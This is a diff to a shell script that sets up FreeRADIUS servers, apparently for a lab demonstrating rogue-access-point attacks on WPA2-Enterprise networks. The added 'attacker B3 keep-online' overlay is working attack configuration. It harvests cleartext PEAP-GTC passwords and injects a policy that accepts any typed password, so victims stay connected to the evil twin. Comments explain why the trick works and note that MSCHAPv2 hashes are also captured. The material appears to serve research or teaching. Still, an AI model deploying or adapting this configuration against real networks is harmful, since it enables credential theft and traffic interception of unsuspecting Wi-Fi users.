@@ -286,6 +286,46 @@ EOF
 sed -i -E '0,/^post-auth \{/s//post-auth {\n\tcapture_gtc/' "$b3dir/sites-enabled/inner-tunnel"
 sed -i -E '0,/Post-Auth-Type REJECT \{/s//Post-Auth-Type REJECT {\n\t\tcapture_gtc/' "$b3dir/sites-enabled/inner-tunnel"
 
+# --- attacker B3 keep-online overlay ----------------------------------------
+# By default B3 harvests the cleartext password and then REJECTS: its users file
+# only knows fetch@gecko.ch, so a real identity has no Cleartext-Password to
+# authenticate against and the victim never associates ("couldn't connect").
+# This overlay makes B3 a FULL evil twin: the victim stays associated while the
+# password is still captured. It works because PEAP derives its session keys
+# (MSK) from the attacker-controlled TLS tunnel, NOT from the inner password, so
+# the keys derive and the WPA2 4-way handshake completes without the attacker
+# knowing the real password. No upstream is bridged - association alone is enough
+# for a local captive-portal / HTTP-redirect demo (opennds serves it offline).
+#
+# Mechanism (verified against the debug log): with PEAP-GTC the typed password is
+# NOT visible in the inner-tunnel authorize section - the eap_gtc submodule only
+# decodes it during authenticate, then immediately runs its OWN internal
+# `Auth-Type PAP {}` section. Stock pap fails there with "No password configured
+# for the user" because an unknown identity has no &control:Cleartext-Password.
+# So the ONLY place the typed password exists AND we can still influence the
+# result is inside that Auth-Type PAP block. We set Cleartext-Password to the
+# typed password itself, so pap compares the password against itself -> match ->
+# accept. (An MSCHAPv2 fallback still cannot associate - mutual auth needs the
+# real NT hash - but its hash is captured as before.)
+cat > "$b3dir/policy.d/accept_any" <<'EOF'
+# For any identity other than the public onboarding one, make the inner PAP check
+# succeed by setting the "known" password to whatever the client just typed. Must
+# run INSIDE the Auth-Type PAP block that eap_gtc invokes, where &User-Password is
+# populated; it is empty in the authorize section, so hooking there never fires.
+force_accept_gtc {
+	if (&User-Name != "fetch@gecko.ch" && "%{User-Password}") {
+		update control {
+			&Cleartext-Password := "%{User-Password}"
+		}
+	}
+}
+EOF
+# Inject at the top of the inner-tunnel's `Auth-Type PAP {` block (one leading
+# tab, line ~203), before the stock `pap` runs.
+sed -i -E '0,/^\tAuth-Type PAP \{$/s//\tAuth-Type PAP {\n\t\tforce_accept_gtc/' "$b3dir/sites-enabled/inner-tunnel"
+echo "attacker-b3: KEEP-ONLINE enabled (accepts any GTC login; victim stays associated)"
+
+
 for name in legit attacker-b1 attacker-b2 attacker-b3; do
     sudo freeradius -C -d "$BASE/$name" >/dev/null 2>&1 \
         && echo "$name: config OK" \
